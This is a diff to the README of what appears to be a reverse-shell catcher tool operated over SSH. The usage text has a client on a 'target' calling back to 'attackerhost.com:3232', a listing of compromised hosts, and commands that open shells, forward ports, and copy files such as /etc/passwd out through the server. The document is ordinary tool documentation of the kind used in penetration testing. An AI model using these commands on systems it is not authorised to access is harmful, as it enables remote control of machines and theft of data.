@@ -42,8 +42,24 @@ cp ~/.ssh/id_ed25519.pub authorized_keys
 # copy client to your target then connect to the server
 ./client attackerhost.com:3232
 
-# connect to the server from your attacker host
-ssh localhost -p 3232
+# Get help text
+ssh localhost -p 3232 help
+
+# See clients
+ssh localhost -p 3232 ls
+
+                                Targets
++------------------------------------------+------------+-------------+
+| ID                                       | Hostname   | IP Address  |
++------------------------------------------+------------+-------------+
+| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root@wombo | [::1]:45150 |
++------------------------------------------+------------+-------------+
+
+
+# Connect to full shell
+ssh -J localhost:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac
+
+
 ```
 
 ## Setup Instructions
@@ -79,75 +95,40 @@ Put the client binary on whatever you want to control, then connect to the serve
 ./client yourserver.com:3232
 ```
 
-Finally connect to your reverse shell catcher server to administrate, connect through etc:
+You can then see what reverse shells have connected to you using `ls`:
 
 ```sh
-ssh yourserver.com -p 3232
-```
-
-## Features
-
-### Proxy
-
-Using just the general dynamical forward `-D` flag you can proxy network traffic to your controlled hosts.
-
-First you connect to your reverse shell catcher.
-
-```sh
-ssh -D 9050 catcher.com -p 3232
-```
-
-Then use the `proxy connect <remote_id>` command to connect to your reverse shell.
-
-```sh
-catcher$ proxy connect 0bda3b12d3ce83f895632d412261073dc93dba3e 
-Connected: 0bda3b12d3ce83f895632d412261073dc93dba3e
-catcher$ 
-```
-
-After this, just point your tools/web browser to the socks5 port open on your local machine (in this example on port 9050) and you're away laughing.
-
-You can obviously only proxy to one host at a time.
-
-### SCP
-
-You can transfer files to and from your controlled hosts using SCP. Essentially you address which host you want to download/upload to by `<ip_address>:<remote_id>:/path/here`.
-
-e.g to upload the directory test to the host `0be2782caae4bedff780e14526f7618ab61e24fa`:
-
-```sh
-scp -r -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:$(pwd -P)/test2
-```
-
-Or to download `/etc/passwd` from a host:
-
-```sh
-scp -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:/etc/passwd
-```
-
-### Shell
-
-On connection you will be presented by a list of controllable clients, e.g:
-
-```sh
-catcher$ ls
+ssh yourserver.com -p 3232 ls
                                 Targets
 +------------------------------------------+------------+-------------+
 | ID                                       | Hostname   | IP Address  |
 +------------------------------------------+------------+-------------+
 | 0f6ffecb15d75574e5e955e014e0546f6e2851ac | root@wombo | [::1]:45150 |
 +------------------------------------------+------------+-------------+
+
 ```
 
-Use `help` or press `tab` to view commands.  
-Tab will auto complete entries.
-So you you wanted to connect to the client given in the example:
+Then typical ssh commands work, just specify your rssh server as a jump host. 
 
 ```sh
-> connect a<TAB>
+# Connect to full shell
+ssh -J youserver.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac
+
+# Run a command without pty
+ssh -J youserver.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac ls
+
+# Start remote forward 
+ssh -R 1234:localhost:1234 -J youserver.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac ls
+
+# Start dynamic forward 
+ssh -D 9050 -J youserver.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac ls
+
+# SCP 
+scp -J youserver.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac:/etc/passwd .
+
 ```
 
-Will auto complete the entry for you and on enter will connect you to your reverse shell.
+## Fancy Features
 
 ### Default Server
 
@@ -163,7 +144,7 @@ $ bin/client
 $ bin/client example.com:1234
 ```
 
-## Foreground vs Background
+## Foreground vs Background (Important note about clients)
 
 By default, clients will run in the background. When started they will execute a new background instance (thus forking a new child process) and then the parent process will exit. If the fork is successful the message "Ending parent" will be printed.
 
